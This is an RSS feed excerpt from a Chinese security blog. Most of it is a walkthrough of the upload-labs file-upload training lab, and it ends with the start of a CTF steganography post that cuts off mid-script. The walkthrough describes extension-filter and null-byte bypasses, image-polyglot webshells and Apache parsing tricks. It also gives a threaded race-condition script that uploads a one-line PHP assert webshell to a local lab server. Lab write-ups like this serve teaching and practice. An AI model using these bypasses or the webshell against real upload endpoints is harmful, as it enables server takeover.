&lt;p&gt;黑名单过滤，注意第15行和之前不太一样，路径拼接的是处理后的文件名，于是构造info.php. . （点+空格+点），经过处理后，文件名变成info.php.，即可绕过，经过windows文件系统的特性处理后即可上传访问成功。&lt;/p&gt;
&lt;h2 id=&quot;pass-10--双写后缀名&quot;&gt;Pass-10  （双写后缀名）&lt;/h2&gt;
&lt;p&gt;第8行代码存在上传漏洞：&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;：&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$deny_ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;htm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;phtml&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pht&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jsp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jspa&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jspx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jsw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jsv&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jspf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jtml&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;asp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;aspx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;asa&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;asax&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ascx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ashx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;asmx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;swf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;htaccess&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'upload_file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_ireplace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$deny_ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;该代码的作用为将第六行中的$deny_ext中的后缀名替换为空。
所以本题目可以使用双写后缀名的方法进行绕过。
&lt;img src=&quot;https://i.loli.net/2019/04/12/5cafeae609ce6.png&quot; alt=&quot;屏幕快照 2019-04-12 09.29.58.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;pass-11-00截断-00&quot;&gt;Pass-11 （00截断-%00）&lt;/h2&gt;
&lt;p&gt;抓包上传发现，文件的命名格式是将路径与文件名连接起来进行上传
&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb066949f76d.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb066949f76d.png&quot; alt=&quot;屏幕快照 2019-04-12 18.20.15.png&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
解题方法为：
&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb06c2b6b4ba.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb06c2b6b4ba.png&quot; alt=&quot;屏幕快照 2019-04-12 18.44.22.png&quot; /&gt;&lt;/a&gt;
讲道理这样就算上传成功了但是我遇到了些问题，可能服务器安全策略配置问题，放弃挣扎。
&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb06c2b1ae6a.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb06c2b1ae6a.png&quot; alt=&quot;屏幕快照 2019-04-12 18.26.16.png&quot; /&gt;&lt;/a&gt;
如果哪位大佬知道怎么回事可以评论告诉我&lt;/p&gt;
&lt;h2 id=&quot;pass-12-00截断-0x00&quot;&gt;Pass-12 （00截断-0x00)&lt;/h2&gt;
&lt;p&gt;同Pass-11 但是这次需要将%00换成空格，然后在hex选项卡中将20改为00&lt;/p&gt;

&lt;h2 id=&quot;pass-13-添加文件头进行绕过&quot;&gt;Pass-13 (添加文件头进行绕过)&lt;/h2&gt;

&lt;p&gt;绕过文件头检查，添加GIF图片的文件头&lt;code class=&quot;highlighter-rouge&quot;&gt;GIF89a&lt;/code&gt;，绕过GIF图片检查。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/13-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;copy normal.jpg /b + shell.php /a webshell.jpg&lt;/code&gt;，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。&lt;a href=&quot;https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.jpg&quot;&gt;JPG一句话shell参考示例&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/13-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;png图片处理方式同上。&lt;a href=&quot;https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.png&quot;&gt;PNG一句话shell参考示例&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/13-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;pass-14&quot;&gt;Pass-14&lt;/h2&gt;

&lt;p&gt;原理和示例同&lt;strong&gt;Pass-13&lt;/strong&gt;，添加GIF图片的文件头绕过检查&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/14-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;png图片webshell上传同&lt;strong&gt;Pass-13&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;jpg/jpeg图片webshell上传存在问题，正常的图片也上传不了，等待作者调整。&lt;/p&gt;

&lt;h2 id=&quot;pass-15&quot;&gt;Pass-15&lt;/h2&gt;

&lt;p&gt;原理同&lt;strong&gt;Pass-13&lt;/strong&gt;，添加GIF图片的文件头绕过检查&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/15-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;png图片webshell上传同&lt;strong&gt;Pass-13&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;jpg/jpeg图片webshell上传同&lt;strong&gt;Pass-13&lt;/strong&gt;。&lt;/p&gt;

&lt;h2 id=&quot;pass-16-对比渲染图片添加代码&quot;&gt;Pass-16 （对比渲染图片，添加代码）&lt;/h2&gt;

&lt;p&gt;原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。&lt;/p&gt;

&lt;p&gt;这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片&lt;a href=&quot;https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromgif-pass-00.gif&quot;&gt;示例&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;打开被渲染后的图片，Webshell代码仍然存在&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;提供一个jpg格式图片绕过imagecreatefromjpeg函数渲染的一个&lt;a href=&quot;https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromjpeg-pass-LandGrey.jpg&quot;&gt;示例文件&lt;/a&gt;。 直接上传示例文件会触发Warning警告，并提示文件不是jpg格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从上面上传jpg图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常png图片内插入webshell代码，然后上传&lt;a href=&quot;https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefrompng-pass-LandGrey.png&quot;&gt;示例文件&lt;/a&gt;即可，并不需要图片是正常的图片。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;程序依然没有对文件重命名，携带webshell的无效损坏png图片直接被上传成功。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;同时你也可以使用工具对文件进行渲染：
https://wiki.ioin.in/soft/detail/1q
先上传正常图片，经过渲染后下载正常图片，使用该工具处理经过渲染的图片，成功上传。&lt;/p&gt;
&lt;h2 id=&quot;pass-17-多线程并发上传绕过删除条件竞争&quot;&gt;Pass-17 （多线程并发上传绕过删除条件竞争）&lt;/h2&gt;

&lt;p&gt;利用条件竞争删除文件时间差绕过。使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;pip install hackhttp&lt;/code&gt;安装&lt;a href=&quot;https://github.com/BugScanTeam/hackhttp&quot;&gt;hackhttp&lt;/a&gt;模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
# coding:utf-8
# Build By LandGrey
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hackhttp&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;multiprocessing.dummy&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pool&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hackhttp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hackhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/upload-labs/Pass-17/index.php
Cookie: pass=17
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------6696274297634
Content-Length: 341

-----------------------------6696274297634
Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.php&quot;
Content-Type: application/octet-stream

&amp;lt;?php assert($_POST[&quot;LandGrey&quot;])?&amp;gt;
-----------------------------6696274297634
Content-Disposition: form-data; name=&quot;submit&quot;

上传
-----------------------------6696274297634--
&quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://127.0.0.1/upload-labs/Pass-17/index.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在脚本运行的时候，访问Webshell&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/17-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;pass-18-多线程并发绕过重命名条件竞争&quot;&gt;Pass-18 （多线程并发绕过重命名条件竞争）&lt;/h2&gt;

&lt;p&gt;刚开始没有找到绕过方法，最后下载作者Github提供的打包环境，利用上传重命名竞争+Apache解析漏洞，成功绕过。&lt;/p&gt;

&lt;p&gt;上传名字为&lt;code class=&quot;highlighter-rouge&quot;&gt;18.php.7Z&lt;/code&gt;的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/18-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;快速提交上面的数据包，可以让文件名字不被重命名上传成功。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/18-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后利用Apache的解析漏洞，即可获得shell&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/18-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;pass-19&quot;&gt;Pass-19&lt;/h2&gt;

&lt;p&gt;原理同&lt;strong&gt;Pass-11&lt;/strong&gt;，上传的文件名用0x00绕过。改成&lt;code class=&quot;highlighter-rouge&quot;&gt;19.php【二进制00】.1.jpg&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/19-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;

&lt;p&gt;可以发现以上绕过方法中有些是重复的，有些是意外情况，可能与项目作者的本意不符，故本文仅作为参考使用。&lt;/p&gt;

&lt;p&gt;等作者修复代码逻辑后，本文也会适时更新。&lt;/p&gt;
</description>
        <pubDate>Tue, 09 Apr 2019 04:49:43 +0800</pubDate>
        <link>http://localhost:4000/2019/04/09/uplodelabs.html</link>
        <guid isPermaLink="true">http://localhost:4000/2019/04/09/uplodelabs.html</guid>
        
        <category>CTF</category>
        
        <category>WEB</category>
        
        <category>ALL</category>
        
        
        <category>CTF</category>
        
        <category>WEB</category>
        
        <category>ALL</category>
        
      </item>
    
      <item>
        <title>CTF 杂项题目总结（持续更新）</title>
        <description>&lt;h2 id=&quot;图片隐写&quot;&gt;图片隐写&lt;/h2&gt;

&lt;p&gt;博客中题目文件下载地址：&lt;br /&gt;
https://home.mycloud.com/action/share/db1ed206-5f81-4d3a-b4be-865c5fe78a2c&lt;/p&gt;

&lt;h2 id=&quot;图片tiff&quot;&gt;图片TIFF&lt;/h2&gt;

&lt;p&gt;题目文件：ada.jpg
使用binwalk分析图片中的信息如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ada.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;发现在图片中有zip，文件和TIFF信息。zip压缩包解压需要密码。查看一下TIFF信息，打开图片的详细信息部分，查看照片的相机信息，发现十六进制字符串，转换为字符串为 sdnisc_2018 即为压缩包密码，解压压缩包得到flag &lt;br /&gt;
进制转换工具推荐：co0ontty.github.io/things/cyberchef.htm&lt;/p&gt;

&lt;h2 id=&quot;png-ihdr隐写&quot;&gt;PNG-IHDR隐写&lt;/h2&gt;

&lt;p&gt;题目文件：2.png
该图片，在windows下面可以正常打开，在LINUX下却无法打开，则判断可能是通过修改PNG的长宽高实现的隐写。&lt;br /&gt;
使用工具打开图片，分析文件头种IHDR部分&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/PNG-IHDR.png&quot; alt=&quot;avatar&quot; /&gt; &lt;br /&gt;
IHDR后的部分，前4 bytes为PNG图像的宽度，接下来的4 bytes为PNG图像的长度&lt;br /&gt;
通过windows打开图像可以发现，图片的宽度大于长度，所以将长度修改与宽度相等，得到答案&lt;br /&gt;
&lt;img src=&quot;/assets/img/posts/PNG-IHDR2.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;百里挑一exif&quot;&gt;百里挑一（EXIF）&lt;/h2&gt;

&lt;p&gt;首先使用wireshark导出http文件，发现有一部分图片，使用脚本分理处图片中的flag发现只有一半。
 使用wireshark筛选ftp数据。
 &lt;img src=&quot;/assets/img/posts/ah-1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;发现文件使用的为被动模式传输，传输端口为38x256+111 = 9839（传输文件使用的端口）
 更改筛选条件为tcp，端口为 9839
 &lt;img src=&quot;/assets/img/posts/ah-2.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;追踪PSH,ACK流，导出原始数据为jpg文件格式（其他流同上步骤）
 &lt;img src=&quot;/assets/img/posts/ah-4.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用脚本调用exiftool分析得到答案&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#coding=UTF-8
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;imgs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;imgs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imgs&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'.jpg'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exif_dict&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'exiftool '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exif&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
